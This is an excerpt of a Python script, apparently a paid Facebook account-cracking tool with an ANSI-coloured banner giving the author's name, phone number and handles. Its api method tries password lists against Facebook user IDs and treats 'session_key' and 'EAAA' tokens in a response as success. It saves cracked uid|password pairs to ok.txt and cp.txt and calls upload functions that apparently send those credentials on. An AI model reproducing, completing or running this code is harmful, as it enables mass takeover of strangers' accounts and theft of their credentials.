...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Anwarmano/approval.txt/blob/main/approval.py').text
			if basesplit in plr:
				key = basesplit
...
..:::::..::..::::..:::...::...:::..:::::..::..:::::..::                                            
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : ANWAR MALIK   
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;93mWHATS UP : +919509639446
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;94mGITHUB   : ANNUMANO
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;95mPAID TOOL  : MEWATI BRAND
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %sMR ANWAR MALIK"%(G,R,G,B,G))
		...
		print("%s [%s6%s]%s CRxACK RANDOM FB ID 2004-6 %s(PRO) V2"%(R,G,R,Y,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [ANWAR] : %s/%s -> \033[0;92m [ ANWAR-OK:%s ]- \033[0;91m[ANWAR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ANWAR-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [ANWAR-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[ANWAR-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [ANWAR-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
